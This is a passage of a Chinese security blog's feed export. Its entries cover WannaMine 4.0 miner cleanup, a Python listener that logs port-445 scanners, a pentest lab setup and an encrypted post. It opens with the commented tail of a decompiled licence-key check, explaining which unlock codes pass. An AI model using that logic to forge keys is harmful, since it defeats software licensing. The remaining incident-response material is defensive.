<span class="number">5</span>);<span class="comment">//第5位开始截取5个字符</span></span><br><span class="line"><span class="keyword">if</span> (a == <span class="string">"IALV"</span>)<span class="comment">//如果5~9的字符为IALV flag为假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0[<span class="number">0</span>] != <span class="string">'F'</span>)<span class="comment">//如果输入的第一个字符不为F，返回假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num = <span class="keyword">int</span>.Parse(string_0[<span class="number">2</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != <span class="string">"I:ALV"</span>)<span class="comment">//如果5~9的字符不为I:ALV 返回假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">num = <span class="keyword">int</span>.Parse(string_0[<span class="number">3</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">int</span>.TryParse(string_0.Substring(<span class="number">10</span>, <span class="number">3</span>), <span class="keyword">out</span> num))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0.Length &lt;= <span class="number">14</span>) <span class="comment">//长度小于14 返回假</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Invalid Unlock Code"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> num2 = <span class="keyword">int</span>.Parse(string_0.Substring(<span class="number">15</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (num2 != <span class="number">2</span> &amp;&amp; num2 != <span class="number">3</span>) <span class="comment">//第16位不等于2或3，返回假</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Incorrect Code for Version"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span> s = string_0.Substring(<span class="number">0</span>, <span class="number">16</span>); <span class="comment">//从第1位开始取16位</span></span><br><span class="line"><span class="keyword">string</span> b = string_0.Substring(<span class="number">16</span>);<span class="comment">//17位开始取后面的</span></span><br><span class="line"><span class="keyword">int</span> num3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = Encoding.ASCII.GetBytes(s);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (bytes[i] % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">num3++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> !(num3.ToString(<span class="string">"00"</span>) != b) &amp;&amp; flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具ji </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WannaMine蠕虫清理</title>
      <link href="/p/4319.html"/>
      <url>/p/4319.html</url>
      
        <content type="html"><![CDATA[<p>今天接到了内网的检测服务器告警，检测到我的主机对外扫描445端口</p><a id="more"></a><p>本次监测使用了2台基于VMware ESXi架构的虚拟服务器，IP及系统架构如下</p><ul><li>10.16.11.51 CentOS7【监测机】</li><li>10.16.11.15 Windows Server 2008 R2【诱捕机】<h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1>脚本使用Python3编写，运行于CentOS7虚拟机（10.16.11.51）上，由于感染后的机器特征为向外部扫描445端口，如下图所示</li></ul><p><img src= "/img/loading.gif" data-lazy-src="/images/Snipaste_2019-06-02_18-08-48.png" alt="被感染主机的网络连接"></p><p>脚本编写思路为监听445端口，如有连接即写入文件并记录连接IP<br>代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 处理客户端请求</span></span><br><span class="line"><span class="comment"># 监听任意地址</span></span><br><span class="line">IP_ADDRESS = <span class="string">'0.0.0.0'</span></span><br><span class="line"><span class="comment"># 记录的文件名</span></span><br><span class="line">FILENAME = <span class="string">'log.txt'</span></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">PORT = <span class="number">445</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printalert</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printsuccess</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;32m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printwarning</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;33m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[0;34m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tcp_server</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.tcp_socket.bind((IP_ADDRESS, PORT))</span><br><span class="line">        self.tcp_socket.listen(<span class="number">250</span>)</span><br><span class="line">        self.proceses = []</span><br><span class="line">        printsuccess(<span class="string">'Server Start Success,Waiting For Connect....\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_server</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sock, addr = self.tcp_socket.accept()</span><br><span class="line">            <span class="comment"># 创建新线程来处理每个客户端连接</span></span><br><span class="line">            t = threading.Thread(target=self.tcp_server, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span><span class="params">(self, sock, addr)</span>:</span></span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime())</span><br><span class="line">        printinfo(<span class="string">'[i] Accept new connection from %s:%s'</span> % addr + <span class="string">' ...at ['</span> + str(TIME) + <span class="string">']\n'</span>)</span><br><span class="line">        printinfo(<span class="string">'当前线程：'</span> + threading.current_thread().name + <span class="string">'\n'</span>)</span><br><span class="line">        self.writelog(addr)</span><br><span class="line">        sock.close()</span><br><span class="line">        printinfo(<span class="string">'[-] Connection from %s:%s closed \n'</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写日志</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writelog</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime())</span><br><span class="line">        <span class="keyword">with</span> open(FILENAME, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">            line = file.read().splitlines()</span><br><span class="line">            <span class="keyword">if</span> addr[<span class="number">0</span>] <span class="keyword">in</span> line:</span><br><span class="line">                printwarning(<span class="string">'[!] Detect '</span> + str(addr[<span class="number">0</span>]) + <span class="string">' Connect '</span> + str(PORT) + <span class="string">' Port At ['</span> + str(TIME) + <span class="string">'] And This IP Has Been Recorded!\n'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">with</span> open(FILENAME, <span class="string">'a+'</span>) <span class="keyword">as</span> file1:</span><br><span class="line">                    file1.write(str(addr[<span class="number">0</span>]) + <span class="string">'\n'</span>)</span><br><span class="line">                    printalert(<span class="string">'[+] Detect '</span> + str(addr[<span class="number">0</span>]) + <span class="string">' Connect  '</span> + str(PORT) + <span class="string">' Port At ['</span> + str(TIME) + <span class="string">'] .\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = tcp_server()</span><br><span class="line">    s.run_server()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行后如图所示</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559578344395.png" alt="1559578344395"></p><p>当有连接发生时输出相关内容（连接IP、端口、事件产生时间），并记录到脚本运行目录下的<code>log.txt</code>中</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559578408835.png" alt="1559578408835"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559578423971.png" alt="1559578423971"></p><h1 id="诱捕"><a href="#诱捕" class="headerlink" title="诱捕"></a>诱捕</h1><p>10.16.11.15主机关闭防火墙，等待一段时间后被成功植入病毒</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>被成功攻陷后被植入相关工具（NSA武器库），武器库的路径位于<code>C:\Windows\NetworkDistribution</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1.png" alt="1"></p><p>同时系统进程中出现了一个使用<code>cmd</code>启动的非<code>system32目录</code>下的<code>svchost程序</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/2.png" alt="2"></p><p>系统服务中被随机创建了一个服务，本次诱捕机中的服务为<code>ApplicationProtocolHost</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/3.png" alt="3"></p><p>并在<code>C:\Windows\System32</code>下释放与服务名称一致的<code>dll</code>文件，用于被系统正常的<code>svchost</code>启动</p><p><img src= "/img/loading.gif" data-lazy-src="/images/4.png" alt="4"></p><p>由于病毒的服务名称会从以下字符串中拼凑，所以服务名并不为鉴别病毒的可靠方式</p><p><img src= "/img/loading.gif" data-lazy-src="/images/5.png" alt="5"></p><p>主服务的命名规则为<code>“字符串1+字符串2+字符串3”</code>,如上面提及的<code>ApplicationProtocolHost</code>，即<code>Application+Protocol+Host</code>。</p><table><thead><tr><th>字符串1列表</th><th>字符串2列表</th><th>字符串3列表</th></tr></thead><tbody><tr><td>Windows</td><td>Update</td><td>Service</td></tr><tr><td>Microsoft</td><td>Time</td><td>Host</td></tr><tr><td>Network</td><td>NetBIOS</td><td>Client</td></tr><tr><td>Remote</td><td>RPC</td><td>Event</td></tr><tr><td>Function</td><td>Protocol</td><td>Manager</td></tr><tr><td>Secure</td><td>SSDP</td><td>Helper</td></tr><tr><td>Application</td><td>UPnP</td><td>System</td></tr></tbody></table><p>但是由于系统为中文操作系统，因此可以通过该服务的描述进行甄别</p><p><img src= "/img/loading.gif" data-lazy-src="/images/6.png" alt="6"></p><p><code>WannaMine 4.0</code>挖矿主体病毒文件为<code>dllhostex.exe</code>（<code>C:\Windows\System32\dllhostex.exe</code>），负责挖取门罗币。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/7.png" alt="7"></p><h1 id="清理方式"><a href="#清理方式" class="headerlink" title="清理方式"></a>清理方式</h1><ol><li>禁用随机拼凑命名的服务。</li><li>使用<code>XueTr</code>（<code>PChunter</code>）卸载异常的<code>svchost</code>（<code>非system32目录下的svchost程序</code>）的挂载的模块（<code>即上文提到的随机拼凑命名的.dll</code>）<code>并删除</code>。</li><li>结束异常进程</li><li>删除随机拼凑命名的服务。</li><li>删除<code>C:\Windows\System32\dllhostex.exe</code>、<code>C:\Windows\NetworkDistribution\</code></li><li><strong>安装MS17-010补丁</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> Windows Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动式检测445端口扫描</title>
      <link href="/p/f3b3.html"/>
      <url>/p/f3b3.html</url>
      
        <content type="html"><![CDATA[<p>为了检测内网的端口扫描写了个脚本。。。</p><a id="more"></a><h1 id="事情起源"><a href="#事情起源" class="headerlink" title="事情起源"></a>事情起源</h1><p>之前一直在做域控搭建，结果域控机（DC）老是莫名其妙重启，排查事件管理器后发现了点东西</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559234162802.png" alt="1559234162802"></p><p>一堆的电源报警事件（该事件只会在系统非正常关机、重启时出现），后面进<code>ESXi</code>管理面板准备重装时发现蓝屏了，报错显示<code>srv.sys</code>驱动出现问题，经过查询后发现系统有<code>MS17-010</code>漏洞（<code>wannacry</code>干的，能把2016打蓝屏也是没谁了）</p><h1 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h1><p>打补丁，用脚本检测内网的扫描情况，汇报上面让他们处理去吧。。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-05-29 23:18:36</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-05-29 23:18:36</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 处理客户端请求</span></span><br><span class="line"><span class="comment"># 监听任意地址</span></span><br><span class="line">IP_ADDRESS = <span class="string">'0.0.0.0'</span></span><br><span class="line"><span class="comment"># 记录的文件名</span></span><br><span class="line">FILENAME = <span class="string">'log.txt'</span></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">PORT = <span class="number">445</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printalert</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printsuccess</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;32m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printwarning</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;33m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">(string)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[0;34m '</span> + string + <span class="string">' \033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tcp_server</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.tcp_socket.bind((IP_ADDRESS, PORT))</span><br><span class="line">        self.tcp_socket.listen(<span class="number">250</span>)</span><br><span class="line">        self.proceses = []</span><br><span class="line">        printsuccess(<span class="string">'Server Start Success,Waiting For Connect....\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_server</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sock, addr = self.tcp_socket.accept()</span><br><span class="line">            <span class="comment"># 创建新线程来处理每个客户端连接</span></span><br><span class="line">            t = threading.Thread(target=self.tcp_server, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span><span class="params">(self, sock, addr)</span>:</span></span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime())</span><br><span class="line">        printinfo(<span class="string">'[i] Accept new connection from %s:%s'</span> % addr + <span class="string">' ...at ['</span> + str(TIME) + <span class="string">']\n'</span>)</span><br><span class="line">        printinfo(<span class="string">'当前线程：'</span> + threading.current_thread().name + <span class="string">'\n'</span>)</span><br><span class="line">        self.writelog(addr)</span><br><span class="line">        sock.close()</span><br><span class="line">        printinfo(<span class="string">'[-] Connection from %s:%s closed \n'</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写日志</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writelog</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime())</span><br><span class="line">        <span class="keyword">with</span> open(FILENAME, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">            line = file.read().splitlines()</span><br><span class="line">            <span class="keyword">if</span> addr[<span class="number">0</span>] <span class="keyword">in</span> line:</span><br><span class="line">                printwarning(<span class="string">'[!] Detect '</span> + str(addr[<span class="number">0</span>]) + <span class="string">' Connect '</span> + str(PORT) + <span class="string">' Port At ['</span> + str(TIME) + <span class="string">'] And This IP Has Been Recorded!\n'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">with</span> open(FILENAME, <span class="string">'a+'</span>) <span class="keyword">as</span> file1:</span><br><span class="line">                    file1.write(str(addr[<span class="number">0</span>]) + <span class="string">'\n'</span>)</span><br><span class="line">                    printalert(<span class="string">'[+] Detect '</span> + str(addr[<span class="number">0</span>]) + <span class="string">' Connect  '</span> + str(PORT) + <span class="string">' Port At ['</span> + str(TIME) + <span class="string">'] .\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = tcp_server()</span><br><span class="line">    s.run_server()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FILENAME):</span><br><span class="line">        printwarning(<span class="string">'[!] Log file is not exists, will create it.\n'</span>)</span><br><span class="line">        os.system(<span class="string">r"touch &#123;&#125;"</span>.format(FILENAME))</span><br><span class="line">        printsuccess(<span class="string">'[+] Create log file success !\n'</span>)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本是<code>Python3</code>写的，运行截图如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559235245969.png" alt="运行截图"></p><p>脚本运行后会在当前目录生成<code>log.txt</code>，记录抓到的IP</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1559235264036.png" alt="log文件"></p><p>然后挂在后台跑就行了，可以用<code>screen</code>开后台任务</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透—环境部署</title>
      <link href="/p/e2be.html"/>
      <url>/p/e2be.html</url>
      
        <content type="html"><![CDATA[<p>记录下部署靶机环境</p><a id="more"></a><h1 id="部署靶机环境"><a href="#部署靶机环境" class="headerlink" title="部署靶机环境"></a>部署靶机环境</h1><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>首先打开靶机的防火墙规则</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1558454560663.png" alt="1558454560663"></p><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>环境部署如下图</p><p><img src= "/img/loading.gif" data-lazy-src="/images/20190527002709055.png" alt=""></p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><h3 id="10-16-11-15"><a href="#10-16-11-15" class="headerlink" title="10.16.11.15"></a>10.16.11.15</h3><p>本台主机配置如下</p><blockquote><p>OS:Windows Server 2008 R2</p><p>App:phpstudy</p><p>CMS: DeDeCMS 20180109</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1558888289570.png" alt="1558888289570"></p><h3 id="10-16-11-16"><a href="#10-16-11-16" class="headerlink" title="10.16.11.16"></a>10.16.11.16</h3><p>本台主机配置如下</p><blockquote><p>OS:Windows Server 2012 R2</p><p>App: phpstudy</p><p>CMS: DeDeCMS 20180109</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360企业安全面试总结</title>
      <link href="/p/cc69.html"/>
      <url>/p/cc69.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="0a1691381d8e0db2b05fdea62a1a2f44b6e82e6a77f336e2701a9bc643ef8fef">875afabfd7c6b3f4ce8c0420034aec6d42edfb32650efb85d3772da31d8dbae94f8404c139fd1ce72035feb7e0c9baf1f863fc864121237485ebf5f45a61a6cdb267df4e25b0a7ca4d96a91b5d6337613af4db157f0898f1c99023947e8472c65a3194d82337b501bfdd1fb14048a4b9bfa15a7bf2507b524b1e909dbec7576437cd4703421d407c3e576cb3f5e860eddafd54f20b97ea884c3118f8e4d0dc725f666172ab677a5aeda4ffe304202c574f5a506185f6667f0d3a646dec3d77443096e1d8b41bf183be68e66f6fb609861f13fbaa8d9847add7910c1acf8e0d1a4e6f6d3bd166e58d1e33ac8d568601853ada424eae22754fb29bc1cb8c66999c68766da9cca42285e81f1f33ee80390cc17ab2615cbb1a2cf554c4ba67d1781c4483f99747c42e973d885ffce6ccd9741e479e0805c7450996fe12b39d26c66caf5e012e7a321bf94c33a8d5028cf99ae752670b754d76a8851fbf99b8a35f1d3f919d898fcfff74f0380de1af2d434f2483efdb713d8560e28a6264bd3e9c347c49fdafb424b4ba8dec3c7775bab477196783fa5b9ba3a17b277daee072a5e14e063d731ec0583bf17574e462842be83e41f8db99153d5eabc51a259033a607807489a34cb9de3b800495a38b47421f90bab35d6a15de8c2cfc405bade37f4992b9039475ff4f479993f43de136b7c357eb7f7c9a0f40fc1c6f1692c91c7518de2b12becb0a9469fa5ced5c62c819ea78d7411b58bc2587dfea2db901c389f571a682c5bcda442494540c4be233d03b3c7d9652e9be5fcba5ff4c70ff9ebc471f81992eb3349a9242fc46837d5f290c9a9586d592e80b1dad6e71f1e710998e908fe4b9e3bcacaa01e1784cd82351b479b7f01a0152aef4c197cd25088a43a92b03b61c6b8193035d4ea622811febc21fc8de572bd6983b6113d6728699c834378cce326891facf20da95f68df796297a375e18ea8bd234e028cfe0e798b0d158a7c95f9d2a2e43e8f17cbd2fb6a2d6b2929b07dee3a475ef9d207e3ee1791a377717d93127173ac3658c88016bd164692318a13df2fd6496ae568d47ce74d6ae8f51c00973b09ad788ddf83b5b04258a5086fc33040ef0a77477f78dd4789d783dff4ad98208dd6d4373746f8e5d063f42b273e9a2ca8f3cee3d9fae8c650805d7a1e6e55afaf24a080f11d0c020fb909f3350f6bff9e9ce8b0dec32b0d9ea061f69f036e470b8756fd7b75f148faccc74be315196e2b9a8de306e03ce01e5279b5683efe379869b329f9016f7911ab94387ef050ebf31fbe2a46a7a8bcc6ed5ab634b67c9d8543db90866f84069eb655b53b1ec27e7abd3bcb0330748ad4a55ca20852bfe46b14b7fabda9412acf0130677b9b688d7768171fd64945e3d15f74d12b0084a110b8200cb7df64fa360104ff7f29f748613340eef98f4cd4f26e6746ac3a00de41cb8ba046638df98106d26420aa38e7e35697b5ace58846b022578889b5778e9e5be72655b5cc87936cde76a04138b5918200b2a0074700e1406564f2bb14c271f38662e64423abcf3bda9fdfb57fb32a044150cab4abcedc16dcbd2e1ac880b72accb82d4101db6306c9114f0ad19abb41f8d824f323af7e4c17587711482f418606bc8b8796682078688a36f40992e773b3be79a1262c8b3de17b26332905e49d6bcfcca507fb435c7f15f5bdfbc8d1bfb1a16f67cc0e4b2e4d3b215d834c397addb920e9ba9ff7bce63529a9a877afa1cc6e63fa855e7650351caee905e8f54d7aaa3afd30376a34690c887533b5128e5b7681f0492b75565c2f73e866f9856ec07553e7bac27066cf3c988d2955f2deee988ee9ad458de15ed5f55cfe747a8cedaa769aca9be23c2b1a14ab17a34c790319400e7b19daecee1b53344ccdf75cc6ebc1e811e1fe0c3d1fd78acdbc4b77c5f70e4ede189ba04905818864515e5ef43328c51afdbb5ea021d342362463a555dc3a2c9d33b770964c2bbf91242d9b99d0010d5471dd54b60945a5d2f5db2ee6272f97146cb31ec8ca35e1329e767371a831dd7a08162777429f196f18e33fc9b1b42eb42d9767f116f8f0dd92d1491c9ce7062aaad86f3381f07968fb3abdca6baa48cb8631e6baff743feced02afbe4c5a4d53b6c39d2c765304534eccb0091d3530468844214635bb7bab94b8de3c82e4cfd751318af1ab0e0791ac6b71c67e1956f0849f6cd02ea481f86d447d993b2ab8566f32f62104d5974288f820b99f00b5656dfcfd08e363017f8f8534eb2a711dd74e9de193c16743020e8365d3ebe56b4b640fc0b8e00f0ccf95160e204d51008439806f5f7d7a9c9826b75752d7e63ee2b487456cf5ce922f98f2c133735bd39c15722150d63e6732bf8ef8b05ea5505d298fb8cd63327449d8b1e6baa2028a6ffe78db5a8feef8e84e60c3269ca50c128d5169ea0c902d75c72023946a59103e1513f58973a37e63cba42aae28cfa0d3d987bceef8a651c76cecb5f14acd2f7ee82de47d55041f471c3e41d6b5c425e5ec8502bbba8ed8105dd88180bd00407087299b6bf69f4fbdc028f022bf96819cf248d81abb04e878608d7260b5e1b8920a3e900d875d2d097fc2f44eb707217ccb3fccea69e442663303c310a693c42011cdd90acd2e55a244742b90ac1cbcca3974b4d71a86badc18f46b128ff68e75686caec09389de547edd3c88c2b3b25db41ae86d9b474b2e408b424d63e336fe03e9bebee79c8d2023843a0c72c8c526601bb8c534e2a949352c8b42d6d745d73391aa8d520dc4d25d4342d523bbf765a13278bcfd2626afcb70fdf8d08b97783eb5cbdc61250e36ddb7b1b5b60694e31431a988096c3ad203fe42de234e5ffad69399f6189ee55451f9b1ab7054dd018fb9a69a821c8ca7bd2c6b91adb18354786daf446a7447d55347291681596ef64422b35bfcf66352a69624b3e0ab13c483457e57f635e9533671c6a14f744ffcff0aa249c07ec1c30ce1614852503ffa813e9a93abc1fc03d3b8831b988d11a0f44385618f63390cd859ea262fdee10139115db610490e12ecb0c40c67d4f6f5dfaad386f835fbb403da927fbea33b0818d6d92755dc0af52126f2a94fb08bb733a13c03c98d07288913621b073b423cbce513811c76a91a8833affe83e14269982de2ed8464ced330c8a515c705c610d5bf000581f5f96a8b322bc0a7e4288848667f75f906a47beefc4472397ffc31f4931b021315243786850d210262ada089144d476039f47ed55bd5c88c9e1749d44a7925154e3b01bbc774f9e3256c7e3340d87d225deb4590ca15b9c3072db295fe40b81ef157e459e1fa0e092e587e6934354d5f50df011d7ae72fb7ba067e3a33e30a883a9436f9823064b9dc152d55288f73cbe3c163710af0714a160685a887a01fe57fa59ea35f08ab72fa61f998ece50b9d3eed87ad7d907c4002343dee51551c6b8ada02c622cc414c3f2eec272478049e9eb13ed1e9e2f63ad4bd70a80227616b9d7cabf6b3ab906bcd6e8eef24509b9c392b7cbca900e9efbc43c78610c6d003c5de654b2e1d2fefb800f402b4af53783d0d742a7dcc0c2d8e7a4c0ff230cf0dde7a21084024d7d5dbae47ede225a3d166581c6ed379acbeb725fd32d01af77d7cd458584592679afd5798c9588c5032ab0c8234c97f3d8fce9fa8ffc48bb609370cf3aead72cfb5a715aa80e321ba6ca9149cd49dba0dc3ab22998c1407b5f373b917d288ad57d546167f79aa394dc83a6ee8ce6899992ab2f9863db5af207358856a549